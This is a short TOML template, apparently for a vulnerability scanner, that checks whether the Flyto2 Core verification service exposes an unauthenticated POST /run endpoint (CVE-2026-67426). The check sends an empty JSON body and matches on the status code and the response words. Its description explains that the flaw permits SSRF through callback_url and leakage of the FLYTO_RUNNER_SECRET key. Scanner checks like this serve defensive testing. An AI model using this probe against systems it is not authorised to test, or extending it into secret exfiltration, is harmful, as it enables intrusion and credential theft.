[info]
author = "ave"
description = "验证 Flyto2 Core flyto-verification 服务在 0.0.0.0:8344 端口暴露的 POST /run 端点是否存在未授权访问漏洞。该漏洞允许攻击者无需认证即可向 /run 发送请求，利用 callback_url 参数实施 SSRF 攻击并外泄 FLYTO_RUNNER_SECRET 内部密钥。通过发送无认证的 POST 请求并检查 HTTP 200 响应及响应体中的 flyto2/verification/runner 标识来确认漏洞存在。"
id = "POC-AVE-2026-0950"
name = "Flyto2 Core Unauthenticated Verification Service SSRF PoC"
severity = "critical"
tags = ["ave-2026-0950"]
vuln_id = [
    "CVE-2026-67426",
    "AVE-2026-0950",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/run"
protocol = "http"

[poc.requests.body]
content = "{}"
type = "raw"

[poc.requests.headers]
Content-Type = "application/json"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "flyto2",
    "verification",
    "runner",
]
